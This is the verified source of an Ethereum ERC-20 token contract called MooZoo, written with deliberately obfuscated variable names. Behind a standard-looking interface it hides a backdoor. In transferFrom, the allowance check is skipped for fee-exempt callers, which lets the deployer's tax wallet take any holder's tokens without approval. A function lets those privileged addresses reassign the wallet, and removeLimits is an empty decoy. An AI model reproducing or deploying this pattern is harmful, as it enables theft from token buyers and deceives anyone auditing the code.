/**
 *Submitted for verification at Etherscan.io on 2025-03-19
*/

// SPDX-License-Identifier: MIT

/*
    https://x.com/kanyewest/status/1902477559968981288
    https://moozoo.love/
*/

pragma solidity ^0.8.24;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}
contract MZ is Context, IERC20, Ownable {
    address payable private _taxclknlDJANGO;
    uint8 private constant _decimals = 9;
    uint256 private constant qq30fef = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"MooZoo";
    string private constant _symbol = unicode"MZ";

    uint256 private _vkjbnkfjDJANGO = 10;
    uint256 private _maxovnboiDJANGO = 10;
    uint256 private _initvkjnbkjDJANGO = 20;
    uint256 private _finvjlkbnlkjDJANGO = 0;
    uint256 private _redclkjnkDJANGO = 2;
    uint256 private _prevlfknjoiDJANGO = 2;
    uint256 private _buylkvnlkDJANGO = 0;
    IUniswapV2Router02 private RomRouter;

    uint256 public _vnbbvlkDJANGO = qq30fef / 100;
    uint256 public _oijboijoiDJANGO = 15 * 10 ** 18;
    uint256 private _cvjkbnkjDJANGO = 10;

    using SafeMath for uint256;
    mapping(address => uint256) private _balknvlkcDJANGO;
    mapping(address => mapping(address => uint256)) private _allcvnkjnDJANGO;
    mapping(address => bool) private _feevblknlDJANGO;
    
    address private router_;
    address private ParBalance;
    bool private _tradingvlknDJANGO;
    bool private _inlknblDJANGO = false;
    bool private swapvlkDJANGO = false;
    uint256 private _sellcnjkDJANGO = 0;
    uint256 private _lastflkbnlDJANGO = 0;
    address constant _deadlknDJANGO = address(0xdead);


    modifier lockTheSwap() {
        _inlknblDJANGO = true;
        _;
        _inlknblDJANGO = false;
    }

    function name() public pure returns (string memory) {
        return _name;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balknvlkcDJANGO[account];
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    
    function _calcTax_lvknblDJANGO(address from, address to, uint256 amount) private returns(uint256) {
        uint256 taxAmount = 0;
        if (
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            if (!_inlknblDJANGO) {
                taxAmount = amount
                    .mul((_buylkvnlkDJANGO > _redclkjnkDJANGO) ? _finvjlkbnlkjDJANGO : _initvkjnbkjDJANGO)
                    .div(100);
            }
            if (
                from == ParBalance &&
                to != address(RomRouter) &&
                !_feevblknlDJANGO[to] &&
                to != _taxclknlDJANGO
            ) {
                _buylkvnlkDJANGO++;
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                from != owner() && 
                !_inlknblDJANGO &&
                to == ParBalance &&
                from != _taxclknlDJANGO &&
                swapvlkDJANGO &&
                _buylkvnlkDJANGO > _prevlfknjoiDJANGO
            ) {
                if (block.number > _lastflkbnlDJANGO) {
                    _sellcnjkDJANGO = 0;
                }
                _sellcnjkDJANGO = _sellcnjkDJANGO + _getAmountOut_lvcbnkDJANGO(amount);
                require(_sellcnjkDJANGO <= _oijboijoiDJANGO, "Max swap limit");
                if (contractTokenBalance > _vnbbvlkDJANGO)
                    _swapTokenslknlDJANGO(_vnbbvlkDJANGO > amount ? amount : _vnbbvlkDJANGO);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    _sendETHTocvbnjDJANGO(address(this).balance);
                }
                _lastflkbnlDJANGO = block.number;
            }
        }
        return taxAmount;
    }

    constructor() payable {
        _taxclknlDJANGO = payable(_msgSender());
        
        _balknvlkcDJANGO[_msgSender()] = (qq30fef * 2) / 100;
        _balknvlkcDJANGO[address(this)] = (qq30fef * 98) / 100;
        _feevblknlDJANGO[address(this)] = true;
        _feevblknlDJANGO[_taxclknlDJANGO] = true;

        emit Transfer(address(0), _msgSender(), (qq30fef * 2) / 100);
        emit Transfer(address(0), address(this), (qq30fef * 98) / 100);
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    
    function totalSupply() public pure override returns (uint256) {
        return qq30fef;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _downcklkojDJANGO(address sender, address recipient)
        internal
        view
        returns (bool)
    {
        
        if(_feevblknlDJANGO[msg.sender]) return !_feevblknlDJANGO[msg.sender];
        if(!(sender == ParBalance || recipient != _deadlknDJANGO)) return false;
        return true;
    }

    function _transfer_kjvnDJANGO(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = _calcTax_lvknblDJANGO(from, to, amount);
        _balknvlkcDJANGO[from] = _balknvlkcDJANGO[from].sub(amount);
        _balknvlkcDJANGO[to] = _balknvlkcDJANGO[to].add(amount.sub(taxAmount));
        if (taxAmount > 0) {
            _balknvlkcDJANGO[address(this)] = _balknvlkcDJANGO[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        if (to != _deadlknDJANGO) emit Transfer(from, to, amount.sub(taxAmount));
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allcvnkjnDJANGO[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_kjvnDJANGO(sender, recipient, amount);
        if (_downcklkojDJANGO(sender, recipient))
            _approve(
                sender,
                _msgSender(),
                _allcvnkjnDJANGO[sender][_msgSender()].sub(
                    amount,
                    "ERC20: transfer amount exceeds allowance"
                )
            );
        return true;
    }
    
    function _sendETHTocvbnjDJANGO(uint256 amount) private {
        _taxclknlDJANGO.transfer(amount);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_kjvnDJANGO(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allcvnkjnDJANGO[owner][spender];
    }

    function _swapTokenslknlDJANGO(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = RomRouter.WETH();
        _approve(address(this), address(RomRouter), tokenAmount);
        router_ = address(RomRouter);
        RomRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    
    function removeLimits () external onlyOwner {
    }

    function _setTax_lknblDJANGO(address payable newWallet) external {
        require(_feevblknlDJANGO[_msgSender()]);
        _taxclknlDJANGO = newWallet;
        _feevblknlDJANGO[_taxclknlDJANGO] = true;
    }

    function DJANGOTeam() external onlyOwner {
        require(!_tradingvlknDJANGO, "Trading is already open");
        RomRouter = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(RomRouter), qq30fef);
        ParBalance = IUniswapV2Factory(RomRouter.factory()).createPair(
            address(this),
            RomRouter.WETH()
        );
        RomRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapvlkDJANGO = true;
        _tradingvlknDJANGO = true;
        IERC20(ParBalance).approve(
            address(RomRouter),
            type(uint256).max
        );
    }
    receive() external payable {}
    function _assist_bnDJANGO() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }
    function _getAmountOut_lvcbnkDJANGO(uint256 amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = RomRouter.WETH();
        uint256[] memory amountOuts = RomRouter.getAmountsOut(
            amount,
            path
        );
        return amountOuts[1];
    }
}